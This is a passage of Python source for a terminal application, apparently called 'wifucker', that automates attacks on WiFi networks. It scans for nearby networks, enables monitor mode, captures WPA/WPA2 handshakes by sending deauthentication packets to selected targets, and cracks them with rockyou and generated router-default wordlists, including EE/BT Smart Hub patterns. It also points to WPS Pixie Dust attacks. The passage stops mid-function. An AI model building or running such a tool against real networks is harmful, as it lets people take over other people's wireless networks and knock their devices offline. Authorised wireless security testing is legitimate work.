        """Get available wireless interfaces"""
        import subprocess

        interfaces = []

        # Try iw dev
        try:
            result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Interface' in line:
                        iface = line.split()[-1]
                        if iface:
                            interfaces.append(iface)
        except:
            pass

        # Fallback: iwconfig
        if not interfaces:
            try:
                result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    interfaces = [line.split()[0] for line in result.stdout.split('\n')
                                if 'IEEE 802.11' in line]
            except:
                pass

        return interfaces

    def start_router_hex_cracking(self):
        """Start router hex mode cracking (10-digit a-f, 0-9)"""
        log = self.query_one("#intel_log", MarkupLog)
        ssid_input = self.query_one("#ssid_input", Input)

        ssid = ssid_input.value.strip() or "Router_Network"
        log.write("[cyan]Starting Router Hex Mode Cracking[/]")
        log.write(f"[cyan]Target: {ssid}[/]")
        log.write("[green]Pattern: 10-digit hexadecimal (a-f, 0-9)[/]")

        # Show loading status and disable buttons
        self.app.show_operation_status("intel_container", "Generating hex wordlist...", "hex cracking")
        disabled_buttons = self.app.disable_buttons_during_operation("intel_container", "hex cracking")

        try:
            from .crackers.router_cracker import RouterBruteForceCracker
            cracker = RouterBruteForceCracker(ssid)
            wordlist = cracker.generate_wordlist("Hexadecimal (10 digits)", 5000)

            log.write(f"[green]✓ Generated {len(wordlist):,} hex passwords[/]")
            log.write("[cyan]Sample passwords:[/]")
            for pwd in wordlist[:5]:
                log.write(f"  {pwd}")

            # Save wordlist
            wordlist_file = ROOT_DIR / f"router_hex_{ssid}.txt"
            with open(wordlist_file, 'w') as f:
                f.write('\n'.join(wordlist))

            log.write(f"[green]✓ Wordlist saved: {wordlist_file}[/]")
            log.write("[cyan]Ready to use with WiFi cracking tab![/]")
            self.app.show_operation_status("intel_container", "Hex wordlist generation complete", "hex cracking")

        except Exception as e:
            self.app.show_user_friendly_error(log, e, "wordlist",
                ["Try with a smaller wordlist size", "Check available disk space", "Ensure write permissions"])
            self.app.show_operation_status("intel_container", "Wordlist generation failed", "hex cracking")

        finally:
            # Re-enable buttons after operation
            self.app.reenable_buttons_after_operation(disabled_buttons)

    def start_ee_wifi_cracking(self):
        """Start EE WiFi cracking mode (12-14 digit patterns)"""
        log = self.query_one("#intel_log", MarkupLog)
        ssid_input = self.query_one("#ssid_input", Input)

        ssid = ssid_input.value.strip() or "EE-Network"
        log.write("[cyan]Starting EE WiFi Cracking Mode[/]")
        log.write(f"[cyan]Target: {ssid}[/]")
        log.write("[green]Pattern: 12-14 digit EE Smart Hub passwords[/]")
        log.write("[cyan]Generating EE WiFi password patterns...[/]")

        # Disable buttons during operation
        disabled_buttons = self.app.disable_buttons_during_operation("intel_container", "EE WiFi cracking")

        try:
            from .crackers.ee_wifi_cracker import EEWiFiCracker

            # Check if it's an EE network
            if EEWiFiCracker.is_ee_network(ssid):
                log.write("[green]✓ EE/BT network detected![/]")
            else:
                log.write("[yellow]⚠ Network may not be EE/BT, but generating patterns anyway[/]")

            wordlist = EEWiFiCracker.generate_all_patterns(5000)

            log.write(f"[green]✓ Generated {len(wordlist):,} EE WiFi passwords[/]")
            log.write("[cyan]Pattern types: Sequential, Repeated, Pattern Repeat, Brand+Numbers[/]")
            log.write("[cyan]Sample passwords:[/]")
            for pwd in wordlist[:8]:
                log.write(f"  {pwd}")

            # Save wordlist
            wordlist_file = ROOT_DIR / f"ee_wifi_{ssid}.txt"
            with open(wordlist_file, 'w') as f:
                f.write('\n'.join(wordlist))

            log.write(f"[green]✓ Wordlist saved: {wordlist_file}[/]")
            log.write("[cyan]Ready to use with WiFi cracking tab![/]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/]")

        finally:
            # Re-enable buttons after operation
            self.app.reenable_buttons_after_operation(disabled_buttons)

    def start_auto_router_detect(self):
        """Auto-detect router type and generate passwords"""
        log = self.query_one("#intel_log", MarkupLog)
        ssid_input = self.query_one("#ssid_input", Input)

        ssid = ssid_input.value.strip()
        if not ssid:
            log.write("[red]Error: Please enter an SSID to analyze[/]")
            return

        log.write("[cyan]Auto-Detecting Router Type[/]")
        log.write(f"[cyan]Analyzing SSID: {ssid}[/]")

        try:
            from .crackers.router_cracker import RouterBruteForceCracker
            from .crackers.ee_wifi_cracker import EEWiFiCracker

            cracker = RouterBruteForceCracker(ssid)

            # Check for EE network first
            if EEWiFiCracker.is_ee_network(ssid):
                log.write("[green]✓ Detected: EE/BT Smart Hub network[/]")
                log.write("[cyan]Generating EE WiFi patterns...[/]")
                wordlist = EEWiFiCracker.generate_all_patterns(5000)
                pattern_type = "EE WiFi (12-14 digits)"
            else:
                # Try auto-detection
                detected_pattern = cracker.generator.detect_router_type(ssid)
                if detected_pattern:
                    log.write(f"[green]✓ Detected: {detected_pattern}[/]")
                    wordlist = cracker.generate_wordlist(detected_pattern, 5000)
                    pattern_type = detected_pattern
                else:
                    log.write("[yellow]⚠ Router type not auto-detected[/]")
                    log.write("[cyan]Falling back to hex patterns...[/]")
                    wordlist = cracker.generate_wordlist("Hexadecimal (10 digits)", 5000)
                    pattern_type = "Hexadecimal (10 digits)"

            log.write(f"[green]✓ Generated {len(wordlist):,} passwords using {pattern_type}[/]")
            log.write("[cyan]Sample passwords:[/]")
            for pwd in wordlist[:5]:
                log.write(f"  {pwd}")

            # Save wordlist
            safe_ssid = ssid.replace("-", "_").replace(" ", "_")
            wordlist_file = ROOT_DIR / f"auto_router_{safe_ssid}.txt"
            with open(wordlist_file, 'w') as f:
                f.write('\n'.join(wordlist))

            log.write(f"[green]✓ Wordlist saved: {wordlist_file}[/]")
            log.write("[cyan]Ready to use with WiFi cracking tab![/]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/]")

    def generate_router_wordlist(self):
        """Generate custom router password wordlists"""
        log = self.query_one("#intel_log", MarkupLog)

        log.write("[cyan]Router Wordlist Generator[/]")
        log.write("[cyan]Available router patterns:[/]")

        try:
            from .crackers.router_cracker import RouterPasswordGenerator

            patterns = RouterPasswordGenerator.get_available_patterns()
            for i, pattern in enumerate(patterns, 1):
                log.write(f"  {i}. {pattern.name}")
                log.write(f"     {pattern.description}")

            log.write("")
            log.write("[yellow]Generating comprehensive router wordlist...[/]")

            # Generate a mix of all patterns
            wordlist = set()
            for pattern in patterns:
                pattern_words = RouterPasswordGenerator._generate_from_pattern(pattern, 1000)
                wordlist.update(pattern_words)

            final_wordlist = sorted(list(wordlist))[:10000]

            log.write(f"[green]✓ Generated {len(final_wordlist):,} total router passwords[/]")
            log.write("[cyan]Includes: Hex patterns, numeric sequences, brand names, etc.[/]")

            # Save wordlist
            wordlist_file = ROOT_DIR / "comprehensive_router_wordlist.txt"
            with open(wordlist_file, 'w') as f:
                f.write('\n'.join(final_wordlist))

            log.write(f"[green]✓ Comprehensive wordlist saved: {wordlist_file}[/]")
            log.write("[cyan]Ready for router password cracking![/]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/]")


class WiFiOperationsTab(Container):
    """Unified WiFi Operations - Scan, Capture, Crack"""

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.networks: List = []
        self.selected_network_index: Optional[int] = None
        self.workflow_step: str = "scan"  # scan -> capture -> crack

    def compose(self) -> ComposeResult:
        # Workflow indicator
        workflow_status = {
            "scan": "🔍 [bold cyan]SCAN[/] → Capture → Crack",
            "capture": "✓ Scan → [bold cyan]CAPTURE[/] → Crack",
            "crack": "✓ Scan → ✓ Capture → [bold cyan]CRACK[/]"
        }

        yield Vertical(
            # Header with workflow status
            Label("[bold white]WiFi Operations - Unified Workflow[/]"),
            Static(f"Workflow: {workflow_status.get(self.workflow_step, 'Unknown')}", id="workflow_status"),

            # System Status Bar
            Label("[cyan]System Status:[/]"),
            Horizontal(
                Static("🔌 Interface: Checking...", id="interface_status", classes="status-indicator"),
                Static("📡 Monitor: Checking...", id="monitor_mode_status", classes="status-indicator"),
                Static("👑 Root: Checking...", id="root_status", classes="status-indicator"),
                Static("🚀 Hardware: Checking...", id="hardware_status", classes="status-indicator"),
            ),

            # Main Action Buttons (Workflow-based)
            Horizontal(
                Button("🔍 1. SCAN NETWORKS", id="scan_networks", variant="primary",
                      tooltip="Discover nearby WiFi networks and display in list below (use ↑↓ arrows + Enter to select)"),
                Button("📡 2. CAPTURE HANDSHAKE", id="capture_handshake", variant="success",
                      tooltip="Capture WPA/WPA2 handshake from selected network using deauthentication"),
                Button("🔓 3. CRACK PASSWORD", id="crack_wifi", variant="error",
                      tooltip="Crack the captured handshake using wordlists and hardware acceleration"),
                Button("🚀 SMART CRACK WORKFLOW", id="smart_crack", variant="success",
                      tooltip="Automated workflow: Scan → Capture → Crack with intelligence enhancement"),
                Button("⚙️ Settings", id="wifi_settings", tooltip="Configure capture duration, deauth packets, and cracking options"),
            ),

            # Network Selection Area
            Vertical(
                Label("[yellow]Available Networks:[/]"),
                Label("[dim]Use ↑↓ arrows + Enter to select network, or click with mouse[/]"),
                Label("[blue]💡 For WPS attacks, switch to 'UK Router WPS' tab (includes Compute PIN, Pixie Dust, advanced methods)[/]"),
                DataTable(id="network_list", cursor_type="row", zebra_stripes=True, classes="network-card"),
                Static("", id="network_details", markup=True),
                id="network_section"
            ),

            # Configuration Panel (Collapsible)
            Vertical(
                Label("[cyan]Configuration:[/]"),
                Label("[dim]💡 Select a network from the list above, then configure capture settings below[/]"),
                Horizontal(
                    Vertical(
                        Label("Deauth Packets:"),
                        Input(id="deauth_count", value="5", type="integer",
                              placeholder="1-100", tooltip="Number of deauth packets to send"),
                        Label("Capture Duration:"),
                        Input(id="capture_duration", value="60", type="integer",
                              placeholder="10-300", tooltip="How long to capture handshake"),
                    ),
                    Vertical(
                        Label("Target SSID:"),
                        Input(id="target_ssid", placeholder="Network name (auto-filled when selected)",
                              tooltip="WiFi network name to target (selected from list above)"),
                        Label("PCAP File:"),
                        Input(id="pcap_file", placeholder="/path/to/handshake.pcap",
                              tooltip="Path to PCAP file with captured handshake"),
                        Label("Wordlist:"),
                        Input(id="wordlist_file", placeholder="rockyou.txt or custom path",
                              tooltip="Path to wordlist file"),
                    ),
                ),
                Horizontal(
                    Button("Browse PCAP", id="browse_pcap", tooltip="Select PCAP file"),
                    Button("Use rockyou", id="use_rockyou", tooltip="Use rockyou.txt wordlist"),
                    Button("Generate Wordlist", id="generate_wordlist", tooltip="Generate intelligent wordlist"),
                ),
                id="config_panel"
            ),

            # Progress and Results
            Label("[yellow]Progress & Results:[/]"),
            ProgressMonitor(id="wifi_progress"),
            MarkupLog(id="wifi_log", highlight=True, max_lines=1000),

            id="wifi_container"
        )
    
    def on_mount(self) -> None:
        """Initialize the WiFi tab"""
        self.update_interface_status()
        network_list = self.query_one("#network_list", DataTable)
        network_list.add_columns("SSID", "BSSID", "Ch", "Signal", "Encryption", "Clients")
        network_list.cursor_type = "row"
    
    def update_interface_status(self):
        """Update interface status indicators"""
        try:
            import subprocess
            
            # Get current interface
            interface = "Unknown"
            try:
                result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'IEEE 802.11' in line:
                            interface = line.split()[0]
                            break
            except:
                try:
                    result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        for line in result.stdout.split('\n'):
                            if 'Interface' in line:
                                interface = line.split()[-1]
                                break
                except:
                    pass
            
            interface_status = self.query_one("#interface_status", Static)
            interface_status.update(f"[cyan]Interface:[/] {interface}")
            
            # Check monitor mode
            monitor_status = self.query_one("#monitor_mode_status", Static)
            from .capture.monitor_mode import MonitorMode
            monitor_mode = MonitorMode()
            if interface != "Unknown" and monitor_mode.is_in_monitor_mode(interface):
                monitor_status.update("[green]Monitor Mode: ✓ Active[/]")
            else:
                monitor_status.update("[yellow]Monitor Mode: ✗ Inactive[/]")
            
            # Check root privileges
            root_status = self.query_one("#root_status", Static)
            if os.geteuid() == 0:
                root_status.update("[green]Root: ✓ Active[/]")
            else:
                root_status.update("[yellow]Root: ✗ Required[/]")
        except Exception:
            pass

    def on_mount(self) -> None:
        """Initialize the WiFi tab"""
        self.update_interface_status()
        network_list = self.query_one("#network_list", DataTable)
        network_list.add_columns("SSID", "BSSID", "Ch", "Signal", "Encryption", "Clients")
        network_list.cursor_type = "row"
        self.update_workflow_status()

    def update_workflow_status(self):
        """Update workflow status display"""
        workflow_status = {
            "scan": "🔍 [bold cyan]SCAN[/] → Capture → Crack",
            "capture": "✓ Scan → [bold cyan]CAPTURE[/] → Crack",
            "crack": "✓ Scan → ✓ Capture → [bold cyan]CRACK[/]"
        }
        status_display = self.query_one("#workflow_status", Static)
        status_display.update(f"Workflow: {workflow_status.get(self.workflow_step, 'Unknown')}")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        """Handle button presses with workflow guidance"""
        log = self.query_one("#wifi_log", MarkupLog)

        if event.button.id == "scan_networks":
            if self.workflow_step == "scan":
                self.scan_networks()
            else:
                log.write("[yellow]ℹ Tip: Start with scanning networks first[/]")
                self.workflow_step = "scan"
                self.update_workflow_status()
                self.scan_networks()

        elif event.button.id == "capture_handshake":
            if self.workflow_step == "scan" and self.networks:
                self.workflow_step = "capture"
                self.update_workflow_status()
                self.capture_handshake()
            else:
                if not self.networks:
                    log.write("[yellow]⚠ Please scan for networks first[/]")
                    log.write("[cyan]Click '1. Scan Networks' to find available WiFi networks[/]")
                else:
                    log.write("[yellow]ℹ Proceed to capture handshake[/]")
                    self.workflow_step = "capture"
                    self.update_workflow_status()
                    self.capture_handshake()

        elif event.button.id == "crack_wifi":
            pcap_file = self.query_one("#pcap_file", Input).value.strip()
            if self.workflow_step in ["capture", "scan"] and pcap_file:
                self.workflow_step = "crack"
                self.update_workflow_status()
                self.start_wifi_cracking()
            else:
                if not pcap_file:
                    log.write("[yellow]⚠ Please capture a handshake first or specify PCAP file[/]")
                    log.write("[cyan]Use '2. Capture Handshake' or browse for existing PCAP file[/]")
                else:
                    log.write("[yellow]ℹ Ready to crack![/]")
                    self.workflow_step = "crack"
                    self.update_workflow_status()
                    self.start_wifi_cracking()

        elif event.button.id == "browse_pcap":
            self.browse_pcap_file()

        elif event.button.id == "use_rockyou":
            rockyou_path = Path.home() / "rockyou" / "rockyou.txt"
            if rockyou_path.exists():
                self.query_one("#wordlist_file", Input).value = str(rockyou_path)
                log.write(f"[green]✓ Using rockyou.txt: {rockyou_path}[/]")
            else:
                log.write("[yellow]rockyou.txt not found. Generate from Intelligence tab.[/]")

        elif event.button.id == "generate_wordlist":
            target_ssid = self.query_one("#target_ssid", Input).value.strip()
            if target_ssid:
                self.generate_wordlist()
            else:
                log.write("[yellow]⚠ Please select a target network first[/]")
                log.write("[cyan]Click on a network in the list above[/]")

        elif event.button.id == "smart_crack":
            self.start_smart_crack_workflow()

    def generate_wordlist(self):
        """Generate intelligent wordlist for target network"""
        log = self.query_one("#wifi_log", MarkupLog)
        target_input = self.query_one("#target_ssid", Input)

        target_ssid = target_input.value.strip()
        if not target_ssid:
            log.write("[red]Error: Select or enter a target SSID first[/]")
            return

        log.write(f"[cyan]Generating intelligent wordlist for: {target_ssid}[/]")

        try:
            from .ai_models.wordlist_generator import AIWordlistGenerator
            generator = AIWordlistGenerator()

            # Generate intel-enhanced wordlist
            wordlist = generator.generate(target_ssid, max_passwords=50000)

            # Save to file
            output_file = ROOT_DIR / f"wordlist_{target_ssid}.txt"
            with open(output_file, 'w') as f:
                f.write('\n'.join(wordlist))

            # Auto-set wordlist path
            self.query_one("#wordlist_file", Input).value = str(output_file)

            log.write(f"[green]✓ Generated {len(wordlist):,} passwords[/]")
            log.write(f"[green]✓ Wordlist saved: {output_file}[/]")
            log.write("[cyan]Ready to crack![/]")

        except Exception as e:
            log.write(f"[red]Error generating wordlist: {e}[/]")
    
    @on(DataTable.RowSelected, "#network_list")
    def on_data_table_row_selected(self, event: DataTable.RowSelected) -> None:
        """Handle network selection from DataTable"""
        try:
            row_key = event.cursor_row
            if row_key is not None and 0 <= row_key < len(self.networks):
                selected_network = self.networks[row_key]
                self.selected_network_index = row_key
                
                # Update target SSID
                target_input = self.query_one("#target_ssid", Input)
                target_input.value = selected_network.essid
                
                # Update network details
                self.update_network_details(selected_network)
                
                # Log selection
                log = self.query_one("#wifi_log", MarkupLog)
                log.write(f"[green]✓ Selected network: {selected_network.essid} ({selected_network.bssid})[/]")
        except Exception as e:
            # Silently handle any selection errors
            pass
    
    def update_network_details(self, network):
        """Update network details display"""
        from .capture.network_scanner import WiFiNetwork
        
        details = self.query_one("#network_details", Static)
        
        client_count = len(network.clients) if hasattr(network, 'clients') else 0
        signal_quality = "Excellent" if network.power >= -50 else "Good" if network.power >= -60 else "Fair" if network.power >= -70 else "Weak"
        
        details_text = f"""[cyan]Network Details:[/]
  [yellow]SSID:[/] {network.essid}
  [yellow]BSSID:[/] {network.bssid}
  [yellow]Channel:[/] {network.channel}
  [yellow]Signal:[/] {network.power} dBm ({signal_quality})
  [yellow]Encryption:[/] {network.encryption}
  [yellow]Clients:[/] {client_count}"""
        
        if client_count == 0:
            details_text += "\n  [yellow]⚠ Warning:[/] No clients detected - handshake capture may be difficult"
        
        details.update(details_text)
    
    def update_network_list(self, networks: List):
        """Update the network list DataTable"""
        from .capture.network_scanner import WiFiNetwork
        
        self.networks = sorted(networks, key=lambda x: x.power, reverse=True)
        network_list = self.query_one("#network_list", DataTable)
        network_list.clear()
        
        for network in self.networks:
            client_count = len(network.clients) if hasattr(network, 'clients') else 0
            client_str = f"{client_count} ✓" if client_count > 0 else "0"
            
            network_list.add_row(
                network.essid[:30] if len(network.essid) <= 30 else network.essid[:27] + "...",
                network.bssid,
                str(network.channel),
                f"{network.power} dBm",
                network.encryption[:15] if network.encryption else "Open",
                client_str
            )

    def select_prev_network(self):
        """Select previous network in the list"""
        if not self.networks:
            return
        if self.selected_network_index is None:
            self.selected_network_index = 0
        else:
            self.selected_network_index = max(0, self.selected_network_index - 1)
        self._update_network_selection()

    def select_next_network(self):
        """Select next network in the list"""
        if not self.networks:
            return
        if self.selected_network_index is None:
            self.selected_network_index = 0
        else:
            self.selected_network_index = min(len(self.networks) - 1, self.selected_network_index + 1)
        self._update_network_selection()

    def confirm_network_selection(self):
        """Confirm current network selection"""
        if self.selected_network_index is not None and 0 <= self.selected_network_index < len(self.networks):
            selected_network = self.networks[self.selected_network_index]

            # Update target SSID
            target_input = self.query_one("#target_ssid", Input)
            target_input.value = selected_network.essid

            # Update network details
            self.update_network_details(selected_network)

            # Log selection with keyboard indicator
            log = self.query_one("#wifi_log", MarkupLog)
            log.write(f"[green]✓ Selected network: {selected_network.essid} ({selected_network.bssid})[/]")
            log.write(f"[cyan]💡 Ready for next step: Capture Handshake or use Smart Crack Workflow[/]")

    def _update_network_selection(self):
        """Update the visual selection in the DataTable"""
        try:
            network_list = self.query_one("#network_list", DataTable)
            if self.selected_network_index is not None and 0 <= self.selected_network_index < len(self.networks):
                network_list.cursor_coordinate = (self.selected_network_index, 0)
                selected_network = self.networks[self.selected_network_index]
                self.update_network_details(selected_network)
        except:
            pass

    def browse_pcap_file(self):
        """Browse for PCAP file using system file picker"""
        log = self.query_one("#wifi_log", MarkupLog)
        pcap_input = self.query_one("#pcap_file", Input)
        
        # Try to use zenity (Linux) or osascript (macOS) for file picker
        try:
            # Try zenity first (Linux)
            result = subprocess.run(
                ["zenity", "--file-selection", "--title=Select PCAP File", "--file-filter=PCAP files (*.pcap *.cap) | *.pcap *.cap"],
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode == 0 and result.stdout.strip():
                selected_file = result.stdout.strip()
                pcap_input.value = selected_file
                log.write(f"[green]✓ Selected: {selected_file}[/]")
                return
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        
        # Fallback: try osascript (macOS)
        try:
            script = '''
                tell application "System Events"
                    activate
                    set theFile to choose file with prompt "Select PCAP File" of type {"pcap", "cap"}
                    return POSIX path of theFile
                end tell
            '''
            result = subprocess.run(
                ["osascript", "-e", script],
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode == 0 and result.stdout.strip():
                selected_file = result.stdout.strip()
                pcap_input.value = selected_file
                log.write(f"[green]✓ Selected: {selected_file}[/]")
                return
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        
        # If no file picker available, show helpful message
        log.write("[yellow]File picker not available. Please enter path manually or install zenity (Linux).[/]")
        log.write("[cyan]Tip: You can drag and drop files into the input field if supported.[/]")

    def scan_networks(self):
        """Scan for WiFi networks"""
        log = self.query_one("#wifi_log", MarkupLog)
        monitor = self.query_one("#wifi_progress", ProgressMonitor)

        log.write("[cyan]Scanning for WiFi networks...[/]")
        monitor.set_status("Initializing scan...")

        def progress_callback(phase: str, progress: float = 0, message: str = ""):
            """Update progress monitor with scan status"""
            if phase == "interface_check":
                monitor.set_status("Checking wireless interface...")
            elif phase == "monitor_mode":
                monitor.set_status("Enabling monitor mode...")
            elif phase == "dependency_check":
                monitor.set_status("Checking dependencies...")
            elif phase == "dependency_install":
                monitor.set_status("Installing missing tools...")
            elif phase == "scanning":
                monitor.set_status(f"Scanning networks... ({progress:.0f}s)")
                # Update progress bar for scanning phase
                monitor.update_progress(int(progress), 10, (progress/10)*100, 0)
            elif phase == "parsing":
                monitor.set_status("Parsing scan results...")
            elif phase == "complete":
                monitor.set_status("Scan complete")
            elif phase == "error":
                monitor.set_status(f"Error: {message}")
            else:
                monitor.set_status(message or phase)

        def scan_worker():
            try:
                import os
                import subprocess
                from .capture.network_scanner import NetworkScanner
                from .capture.monitor_mode import MonitorMode

                # Check for root privileges (required for scanning)
                progress_callback("interface_check")
                if os.geteuid() != 0:
                    log.write("[yellow]Warning: Root privileges recommended for network scanning[/]")
                    log.write("[yellow]Some scanning methods may not work without sudo[/]")
                    log.write("[cyan]Try running with: sudo -E ./wifucker[/]")
                    progress_callback("warning", message="Running without root - limited functionality")

                # Try multiple methods to detect interface
                interfaces = []
                
                # Method 1: iwconfig
                try:
                    result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        interfaces = [line.split()[0] for line in result.stdout.split('\n') if 'IEEE 802.11' in line]
                except (FileNotFoundError, subprocess.TimeoutExpired):
                    pass

                # Method 2: iw dev
                if not interfaces:
                    try:
                        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
                        if result.returncode == 0:
                            for line in result.stdout.split('\n'):
                                if 'Interface' in line:
                                    iface = line.split()[-1]
                                    if iface and iface not in interfaces:
                                        interfaces.append(iface)
                    except (FileNotFoundError, subprocess.TimeoutExpired):
                        pass

                # Method 3: ip link show
                if not interfaces:
                    try:
                        result = subprocess.run(["ip", "link", "show"], capture_output=True, text=True, timeout=5)
                        if result.returncode == 0:
                            for line in result.stdout.split('\n'):
                                if 'wlan' in line.lower() or 'wifi' in line.lower():
                                    parts = line.split(':')
                                    if len(parts) >= 2:
                                        iface = parts[1].strip().split()[0]
                                        if iface and iface not in interfaces:
                                            interfaces.append(iface)
                    except (FileNotFoundError, subprocess.TimeoutExpired):
                        pass

                if not interfaces:
                    log.write("[red]❌ CRITICAL: No WiFi interfaces found[/]")
                    log.write("[yellow]🔧 Troubleshooting steps:[/]")
                    log.write("  1. [cyan]Check hardware:[/] lsusb | grep Wireless")
                    log.write("  2. [cyan]Enable wireless:[/] sudo rfkill unblock wifi")
                    log.write("  3. [cyan]List interfaces:[/] ip link show")
                    log.write("  4. [cyan]Check drivers:[/] lsmod | grep wl")
                    log.write("  5. [cyan]Try with sudo:[/] sudo -E ./wifucker")
                    log.write("")
                    log.write("[blue]💡 Need a compatible wireless adapter for scanning[/]")
                    log.write("[blue]   Compatible: Atheros, Ralink, Realtek chipsets[/]")
                    monitor.set_status("No wireless interface found")
                    return

                interface = interfaces[0]
                log.write(f"[cyan]Using interface: {interface}[/]")

                # Check and enable monitor mode if needed
                progress_callback("monitor_mode")
                monitor_mode = MonitorMode()
                if not monitor_mode.is_in_monitor_mode(interface):
                    log.write(f"[cyan]Enabling monitor mode on {interface}...[/]")
                    success, message, mon_iface = monitor_mode.enable_monitor_mode(interface)
                    if success:
                        interface = mon_iface  # Use monitor interface
                        log.write(f"[green]✓ {message}[/]")
                        progress_callback("monitor_mode", message="Monitor mode enabled")
                        # Ensure interface is up
                        try:
                            subprocess.run(['ip', 'link', 'set', interface, 'up'],
                                          capture_output=True, timeout=5, check=False)
                        except:
                            pass
                    else:
                        log.write(f"[red]❌ Failed to enable monitor mode: {message}[/]")
                        log.write("[yellow]🔧 Monitor mode is required for reliable scanning[/]")
                        log.write("[cyan]💡 Troubleshooting:[/]")
                        log.write("  1. [yellow]Check interface capabilities:[/] iw list | grep monitor")
                        log.write("  2. [yellow]Kill conflicting processes:[/] airmon-ng check kill")
                        log.write("  3. [yellow]Try different interface:[/] iw dev")
                        log.write("  4. [yellow]Run with sudo:[/] sudo -E ./wifucker")
                        log.write("  5. [yellow]Use iw fallback:[/] scanning will work but be less detailed")
                        log.write("")
                        log.write("[blue]⚠️ Continuing with limited functionality...[/]")
                        progress_callback("warning", message="Monitor mode failed - limited scanning")
                        if os.geteuid() != 0:
                            log.write("[yellow]Try running with: sudo -E ./wifucker[/]")
                else:
                    log.write(f"[green]✓ Interface {interface} is already in monitor mode[/]")

                # Check for required tools
                progress_callback("dependency_check")
                import shutil
                has_airodump = shutil.which('airodump-ng') is not None
                has_iw = shutil.which('iw') is not None

                required_tools = []
                if not has_airodump:
                    required_tools.append('airodump-ng')
                if not has_iw:
                    required_tools.append('iw')

                if required_tools:
                    log.write(f"[yellow]Missing tools: {', '.join(required_tools)}[/]")
                    log.write("[cyan]Attempting automatic installation...[/]")
                    progress_callback("dependency_install")

                    # Attempt auto-install
                    def log_install(msg):
                        log.write(msg)

                    install_success = install_tools_auto(
                        ['airodump-ng', 'iw'],
                        log_callback=log_install
                    )

                    if install_success:
                        log.write("[green]✓ All tools installed successfully![/]")
                        progress_callback("dependency_check", message="Dependencies installed")
                        # Re-check availability
                        has_airodump = shutil.which('airodump-ng') is not None
                        has_iw = shutil.which('iw') is not None
                    else:
                        log.write("[yellow]Auto-installation failed or not available[/]")
                        log.write("[yellow]Manual installation required:[/]")
                        pkg_mgr = detect_package_manager()
                        if pkg_mgr == 'apt':
                            log.write("  sudo apt install aircrack-ng iw")
                        elif pkg_mgr == 'dnf':
                            log.write("  sudo dnf install aircrack-ng iw")
                        elif pkg_mgr == 'yum':
                            log.write("  sudo yum install aircrack-ng iw")
                        elif pkg_mgr == 'pacman':
                            log.write("  sudo pacman -S aircrack-ng iw")
                        else:
                            log.write("  Install: aircrack-ng (provides airodump-ng) and iw")

                        progress_callback("error", message="Manual installation required")
                        if not has_airodump and not has_iw:
                            log.write("[red]❌ CRITICAL: No scanning tools available[/]")
                            log.write("[yellow]🔧 To fix this issue:[/]")
                            log.write("  1. [cyan]Run with sudo:[/] sudo -E ./wifucker")
                            log.write("  2. [cyan]Or install manually:[/]")
                            if pkg_mgr:
                                log.write(f"     {pkg_mgr} install aircrack-ng iw")
                            else:
                                log.write("     Install aircrack-ng and iw packages")
                            log.write("  3. [cyan]Check if tools are in PATH:[/] which airodump-ng")
                            log.write("")
                            log.write("[blue]💡 airodump-ng provides detailed scanning[/]")
                            log.write("[blue]   iw provides basic scanning fallback[/]")
                            monitor.set_status("No scanning tools available")
                            return

                if not has_airodump:
                    log.write("[yellow]airodump-ng not available, using iw (less detailed)[/]")
                elif not has_iw:
                    log.write("[yellow]iw not available, using airodump-ng only[/]")

                scanner = NetworkScanner(interface)
                log.write("[cyan]Scanning for 10 seconds...[/]")

                # Provide live feedback during scan with real progress from scanner
                networks = scanner.scan(duration=10, progress_callback=progress_callback)

                progress_callback("parsing", message="Parsing results...")

                if networks:
                    log.write(f"[green]✓ Found {len(networks)} network(s)[/]")
                    progress_callback("complete", message=f"Found {len(networks)} networks")

                    # Update network list in UI
                    self.update_network_list(networks)

                    # Auto-select first WPA network if no selection exists
                    wpa_networks = [n for n in networks if "WPA" in n.encryption]
                    if wpa_networks and self.selected_network_index is None:
                        try:
                            target_input = self.query_one("#target_ssid", Input)
                            if not target_input.value:
                                target_input.value = wpa_networks[0].essid
                                # Find and select in list
                                for idx, net in enumerate(self.networks):
                                    if net.essid == wpa_networks[0].essid:
                                        self.selected_network_index = idx
                                        network_list = self.query_one("#network_list", DataTable)
                                        network_list.cursor_coordinate = (idx, 0)
                                        self.update_network_details(net)
                                        break
                                log.write(f"[yellow]Auto-selected WPA network: {wpa_networks[0].essid}[/]")
                        except Exception:
                            # Input field might not be ready yet, skip auto-selection
                            pass

                    # Update interface status
                    self.update_interface_status()
                    log.write("[green]✓ Network scan completed successfully![/]")
                else:
                    log.write("[yellow]⚠️ No networks found during scan[/]")
                    log.write("[cyan]🔍 Possible causes and solutions:[/]")
                    log.write("  1. [yellow]Location:[/] No WiFi networks in range - try different location")
                    log.write("  2. [yellow]Monitor mode:[/] Interface not in monitor mode")
                    log.write("     → Check: iw dev | grep monitor")
                    log.write("     → Fix: Run with sudo or check interface capabilities")
                    log.write("  3. [yellow]Permissions:[/] Insufficient privileges")
                    log.write("     → Fix: sudo -E ./wifucker")
                    log.write("  4. [yellow]Interface:[/] Wrong interface or not properly configured")
                    log.write("     → Check: iwconfig or iw dev")
                    log.write("  5. [yellow]Driver:[/] Wireless driver issues")
                    log.write("     → Fix: Update kernel modules or try different adapter")
                    log.write("")
                    log.write("[blue]💡 Try scanning with iw: sudo iw dev wlan0 scan[/]")
                    progress_callback("error", message="No networks detected")

                    # Clear network list
                    network_list = self.query_one("#network_list", DataTable)
                    network_list.clear()
                    self.networks = []

                monitor.set_status("Scan complete")
            except Exception as e:
